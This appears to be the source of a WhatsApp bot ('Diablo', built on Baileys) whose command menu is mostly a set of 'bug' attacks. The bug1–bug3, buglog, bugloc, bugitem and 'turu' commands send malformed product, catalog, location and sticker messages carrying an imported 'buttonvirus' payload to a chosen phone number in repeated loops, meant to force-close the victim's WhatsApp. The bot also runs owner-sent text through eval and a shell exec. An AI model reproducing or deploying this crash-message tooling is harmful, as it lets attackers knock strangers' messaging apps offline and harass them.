const { modul } = require('./module');
const { axios, baileys, chalk, cheerio, child_process, crypto, fs, ffmpeg, jsobfus, moment, ms, speed, util } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, reSize, generateProfilePicture } = require('./lib/myfunc')
const { buttonvirus } = require('./scrape/buttonvirus')
const os = require('os')
const { color, bgcolor } = require('./lib/color')
const { uptotelegra } = require('./scrape/upload')
const tiktok = require('./scrape/tiktok')
const audionye = fs.readFileSync('./y.mp3')
const owner = JSON.parse(fs.readFileSync('./database/owner.json').toString())

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {},
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

global.ownerName = 'El Diablo'
global.ownerNumber = ["6281220670449@s.whatsapp.net"]
global.prefa = ['','.']
global.mess = {
    wait: 'Wait Sis Please be patient',
    succes: 'Good Luck Sis ?',
    admin: 'Group Admin Special Features!!!',
    botAdmin: 'Bots Must Be Admins First!!!',
    owner: 'Lu Siapa Kocak?',
    group: 'Features Used Only For Groups!!!',
    private: 'Features Used Only For Private Chat!!!',
    bot: 'Bot Number User Special Features!!!',
    error: 'Error Sis, Please Chat Owner...',
}

module.exports = diablo = async (diablo, diablobotwhatsapp, chatUpdate, store) => {
try {
        const body = (diablobotwhatsapp.mtype === 'conversation') ? diablobotwhatsapp.message.conversation : (diablobotwhatsapp.mtype == 'imageMessage') ? diablobotwhatsapp.message.imageMessage.caption : (diablobotwhatsapp.mtype == 'videoMessage') ? diablobotwhatsapp.message.videoMessage.caption : (diablobotwhatsapp.mtype == 'extendedTextMessage') ? diablobotwhatsapp.message.extendedTextMessage.text : (diablobotwhatsapp.mtype == 'buttonsResponseMessage') ? diablobotwhatsapp.message.buttonsResponseMessage.selectedButtonId : (diablobotwhatsapp.mtype == 'listResponseMessage') ? diablobotwhatsapp.message.listResponseMessage.singleSelectReply.selectedRowId : (diablobotwhatsapp.mtype == 'templateButtonReplyMessage') ? diablobotwhatsapp.message.templateButtonReplyMessage.selectedId : (diablobotwhatsapp.mtype === 'messageContextInfo') ? (diablobotwhatsapp.message.buttonsResponseMessage?.selectedButtonId || diablobotwhatsapp.message.listResponseMessage?.singleSelectReply.selectedRowId || diablobotwhatsapp.text) : ''
        const budy = (typeof diablobotwhatsapp.text == 'string' ? diablobotwhatsapp.text : '')
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®=????+✓_=|~!?@#%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const content = JSON.stringify(diablobotwhatsapp.message)
        const { type, quotedMsg, mentioned, now, fromMe } = diablobotwhatsapp
        const isCmd = body.startsWith(prefix)
        const from = diablobotwhatsapp.key.remoteJid
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = diablobotwhatsapp.pushName || "No Name"
        const botNumber = await diablo.decodeJid(diablo.user.id)
        const itsMediablo = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(diablobotwhatsapp.sender)
        const itsMe = diablobotwhatsapp.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = diablobotwhatsapp.quoted ? diablobotwhatsapp.quoted : diablobotwhatsapp
        const mime = (quoted.msg || quoted).mimetype || ''
        const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
		const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
        const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')  
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedMsg = (type == 'extendedTextMessage')
		const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
		const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
		const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
		const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
		const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false
        const hariRaya = new Date('January 1, 2023 00:00:00')
        const sekarang = new Date().getTime()
        const Selisih = hariRaya - sekarang
        const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
        const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const jmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60))
        const jdetik = Math.floor( Selisih % (1000 * 60) / 1000)
        const sender = diablobotwhatsapp.isGroup ? (diablobotwhatsapp.key.participant ? diablobotwhatsapp.key.participant : diablobotwhatsapp.participant) : diablobotwhatsapp.key.remoteJid
        const groupMetadata = diablobotwhatsapp.isGroup ? await diablo.groupMetadata(diablobotwhatsapp.chat).catch(e => {}) : ''
        const groupName = diablobotwhatsapp.isGroup ? groupMetadata.subject : ''
        const participants = diablobotwhatsapp.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = diablobotwhatsapp.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = diablobotwhatsapp.isGroup ? groupMetadata.owner : ''
        const groupMembers = diablobotwhatsapp.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(diablobotwhatsapp.sender) : false
    	const isAdmins = diablobotwhatsapp.isGroup ? groupAdmins.includes(diablobotwhatsapp.sender) : false
    	
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[diablobotwhatsapp.sender]
if (typeof user !== 'object') global.db.users[diablobotwhatsapp.sender] = {}
const chats = global.db.chats[diablobotwhatsapp.chat]
if (typeof chats !== 'object') global.db.chats[diablobotwhatsapp.chat] = {}
} catch (err) {
console.error(err)
}

if (!diablo.public) {
if (!diablobotwhatsapp.key.fromMe) return
}

if (!diablobotwhatsapp.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(diablobotwhatsapp.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname))
}
if (diablobotwhatsapp.isGroup && isCmd && !fromMe) {
console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(diablobotwhatsapp.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix + command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
}

if (diablobotwhatsapp.sender.startsWith('212')) return diablo.updateBlockStatus(diablobotwhatsapp.sender, 'block')

try {
ppuser = await diablo.profilePictureUrl(diablobotwhatsapp.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await reSize(ppuser, 200, 200)

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${buttonvirus}`, 
"jpegThumbnail": ppnyauser
}
}
}

if (command) {
diablo.sendPresenceUpdate('composing', from)
diablo.readMessages([diablobotwhatsapp.key])
}

async function replyNya(teks) {
                       const buttonsDefault = [{ quickReplyButton: { displayText : `${buttonvirus}`, id : `.menu` } }]                 
                       const buttonMessage = { 
                                    text: teks, 
                                    footer: "", 
                                    templateButtons: buttonsDefault, 
                                    image: {url: ppnyauser}                                   
                                               }
                       return diablo.sendMessage(from, buttonMessage)
                }

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `diablo`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : lep })
return diablo.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}

switch (command) {

case 'menu':
let uptime = await runtime(process.uptime())
jiren = ` 
亗╭┬─────────────────┈ 
亗├ 「 𝘽𝙊𝙏 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋 」
亗├┬─────────────────┈ 
亗├ 𝙫𝙚𝙧𝙨𝙞𝙤𝙣 : 2.0.3
亗├ 𝙡𝙞𝙗 : baileys
亗├ 𝙗𝙤𝙩 𝙣𝙖𝙢𝙚 : Diablo
亗├──────────────────┈
亗├ 「𝘽𝙐𝙂 𝙈𝙀𝙉𝙐」
亗├──────────────────┈
亗├ • ${prefix}bug1 (62xxx)
亗├ • ${prefix}bug2 (62xxx)
亗├ • ${prefix}bug3 (62xxx)
亗├──────────────────┈
亗├ 「𝘽𝙐𝙂 𝙈𝙀𝙉𝙐 𝙑2」
亗├ NOTE : wajib pakai wa immune
亗├──────────────────┈
亗├ • ${prefix}bugvn
亗├ • ${prefix}bugtext
亗├ • ${prefix}buglog
亗├ • ${prefix}bugloc
亗├ • ${prefix}bugkontak
亗├ • ${prefix}bugstick
亗├ • ${prefix}bugitem
亗├ • ${prefix}tag (text)
亗├──────────────────┈
亗├ 「𝙒𝘼𝙍 𝙈𝙊𝘿𝙀」
亗├ NOTE : wajib pakai wa immune
亗├──────────────────┈
亗├ • ${prefix}turu 
亗├─────────────────┈ 
`
diablobotwhatsapp.reply(jiren)
break
case 'restart':{
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
 let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
  let o
  try {
  o = exec('pm2 restart all')
  } catch (e) {
  o = e
 } finally {
let { stdout, stderr } = o
}
}
break
case 'stats':{
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
diablobotwhatsapp.reply(respon)
}
break
case 'turu':{
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
jumlah = '2'
waktu = '2s'
for (let i = 0; i < jumlah; i++) {
diablo.sendMessage(from, { audio: audionye, mimetype: 'audio/mp4', ptt:true, mentions:[diablobotwhatsapp.sender]}, { quoted: lep })
await sleep(ms(waktu))
}

}
{
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
jumlah = '2'
waktu = '2s'
for (let i = 0; i < jumlah; i++) {
diablo.sendMessage(from, {text: "ᬊ͜͡㸑☿𝕵𝖔𝖐𝖊𝖗᭄࿐ IS HERE"},{ quoted: lep })
await sleep(ms(waktu))
}

}
{
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
jumlah = '2'
waktu = '2s'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: diablo.waUploadToServer })
var catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "7091718154232528",
"title": `ᬊ͜͡㸑☿𝕵𝖔𝖐𝖊𝖗᭄࿐ IS HERE`,
"description": `${buttonvirus}${buttonvirus}`,
"currencyCode": "IDR",
"priceAmount1000": "100000000000000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000",
"retailerId": `FC YA CHUAKS`,
"url": `https://wa.me/0`
},
"businessOwnerJid": "6287705048235@s.whatsapp.net",
}
}), { userJid: from, quoted: lep  })
diablo.relayMessage(from, catalog.message, { messageId: catalog.key.id })
await sleep(ms(waktu))
}

}
{
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
jumlah = '2'
waktu = '2s'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: diablo.waUploadToServer })
var liveLocation = generateWAMessageFromContent(from, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"name": "XNXX.COM`",
"url": "https://foursquare.com/v/58245afd7c74e13e299229d9",
"caption": "ᬊ͜͡㸑☿𝕵𝖔𝖐𝖊𝖗᭄࿐ IS HERE",
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
"mtype": "locationMessage"
}
}), { userJid: from, quoted: lep })
diablo.relayMessage(from, liveLocation.message, { messageId: liveLocation.key.id })
await sleep(ms(waktu))
}

}
{
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
jumlah = '2'
waktu = '2s'
for (let i = 0; i < jumlah; i++) {
diablo.sendContact(from, owner, lep)
await sleep(ms(waktu))
}

}
{
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
jumlah = '2'
waktu = '2s'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(from, 'ᬊ͜͡㸑☿𝕵𝖔𝖐𝖊𝖗᭄࿐ IS HERE', ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(ms(waktu))
}

}
{
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
jumlah = '2'
waktu = '2s'
for (let i = 0; i < jumlah; i++) {
diablo.sendMessage(from, {sticker: ppnyauser},{ quoted: lep })
await sleep(ms(waktu))
}
diablobotwhatsapp.reply(`SUCCES`)
}
break
case 'tag':{
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
diablo.sendMessage(diablobotwhatsapp.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: lep })
}
break
case 'bugvn':{
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
jumlah = '3'
waktu = '3s'
for (let i = 0; i < jumlah; i++) {
diablo.sendMessage(from, { audio: audionye, mimetype: 'audio/mp4', ptt:true, mentions:[diablobotwhatsapp.sender]}, { quoted: lep })
await sleep(ms(waktu))
}
diablobotwhatsapp.reply(`Sukses Send Bug Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case 'bugtext':{
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
jumlah = '3'
waktu = '3s'
for (let i = 0; i < jumlah; i++) {
diablo.sendMessage(from, {text: "ᬊ͜͡㸑☿𝕵𝖔𝖐𝖊𝖗᭄࿐ IS HERE"},{ quoted: lep })
await sleep(ms(waktu))
}
diablobotwhatsapp.reply(`Sukses Send Bug Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case 'buglog':{
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
jumlah = '3'
waktu = '3s'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: diablo.waUploadToServer })
var catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "7091718154232528",
"title": `ᬊ͜͡㸑☿𝕵𝖔𝖐𝖊𝖗᭄࿐ IS HERE`,
"description": `${buttonvirus}${buttonvirus}`,
"currencyCode": "IDR",
"priceAmount1000": "100000000000000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000",
"retailerId": `FC YA CHUAKS`,
"url": `https://wa.me/0`
},
"businessOwnerJid": "6287705048235@s.whatsapp.net",
}
}), { userJid: from, quoted: lep  })
diablo.relayMessage(from, catalog.message, { messageId: catalog.key.id })
await sleep(ms(waktu))
}
diablobotwhatsapp.reply(`Sukses Send Bug Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case 'bugloc':{
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
jumlah = '3'
waktu = '3s'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: diablo.waUploadToServer })
var liveLocation = generateWAMessageFromContent(from, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"name": "XNXX.COM`",
"url": "https://foursquare.com/v/58245afd7c74e13e299229d9",
"caption": "ᬊ͜͡㸑☿𝕵𝖔𝖐𝖊𝖗᭄࿐ IS HERE",
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
"mtype": "locationMessage"
}
}), { userJid: from, quoted: lep })
diablo.relayMessage(from, liveLocation.message, { messageId: liveLocation.key.id })
await sleep(ms(waktu))
}
diablobotwhatsapp.reply(`Sukses Send Bug Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case 'bugkontak':{
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
jumlah = '3'
waktu = '3s'
for (let i = 0; i < jumlah; i++) {
diablo.sendContact(from, owner, lep)
await sleep(ms(waktu))
}
diablobotwhatsapp.reply(`Sukses Send Bug Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case 'bugitem':{
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
jumlah = '3'
waktu = '3s'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(from, 'ᬊ͜͡㸑☿𝕵𝖔𝖐𝖊𝖗᭄࿐ IS HERE', ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(ms(waktu))
}
diablobotwhatsapp.reply(`Sukses Send Bug Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case 'bugstick':{
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
jumlah = '3'
waktu = '3s'
for (let i = 0; i < jumlah; i++) {
diablo.sendMessage(from, {sticker: ppnyauser},{ quoted: lep })
await sleep(ms(waktu))
}
diablobotwhatsapp.reply(`Sukses Send Bug Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case 'sc':
diablobotwhatsapp.reply("SC TIDAK DI JUAL!!! tapi klo mau akses bot hub wa.me/6281220670449 harga terjangkau loo")
break
case 'cewek': case 'cecan': {
var yeye = await fetchJson("https://kirbotz-api.herokuapp.com/api/random/cecan?apikey=KirBotz") 
diablo.sendMessage(from,{image:{url:yeye.result.url},caption: `${mess.succes}`}, { quoted: diablobotwhatsapp } )
}
break
case 'bug3':{
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
if (!q) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '3'
waktu = '3s'
for (let i = 0; i < jumlah; i++) {
diablo.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
await sleep(ms(waktu))
}
diablobotwhatsapp.reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case 'bug2': {
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
if (!q) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '3'
waktu = '3s'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(num, 'FC YA CHUAKS', ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(ms(waktu))
}
diablobotwhatsapp.reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break
case 'bug1': {
if (!itsMediablo) return diablobotwhatsapp.reply(mess.owner)
if (!q) return diablobotwhatsapp.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '3'
waktu = '3s'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: diablo.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "7091718154232528",
"title": `MAMPUS FC CHUAKS`,
"description": `${buttonvirus}${buttonvirus}`,
"currencyCode": "IDR",
"priceAmount1000": "100000000000000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000",
"retailerId": `Nomor Owner Di Atas`,
"url": `https://wa.me/0`
},
"businessOwnerJid": "6281220670449@s.whatsapp.net",
}
}), { userJid: from, quoted: lep  })
diablo.relayMessage(num, catalog.message, { messageId: catalog.key.id })
await sleep(ms(waktu))
}
diablobotwhatsapp.reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`)
}
break


case 'owner':{
diablo.sendContact(diablobotwhatsapp.chat, owner, diablobotwhatsapp)
}
break
default:
}
if (budy.startsWith('=>')) {
if (!itsMediablo) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return diablobotwhatsapp.reply(bang)
}
try {
diablobotwhatsapp.reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
diablobotwhatsapp.reply(String(e))
}
}
if (budy.startsWith('>')) {
if (!itsMediablo) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await diablobotwhatsapp.reply(evaled)
} catch (err) {
diablobotwhatsapp.reply(String(err))
}
}
if (budy.startsWith('<')) {
if (!itsMediablo) return
try {
return diablobotwhatsapp.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
if (budy.startsWith('$')){
if (!itsMediablo) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return diablobotwhatsapp.reply(`${err}`)
if (stdout) {
diablobotwhatsapp.reply(stdout)
}
})
}
} catch (err) {
diablobotwhatsapp.reply(util.format(err))
}
} 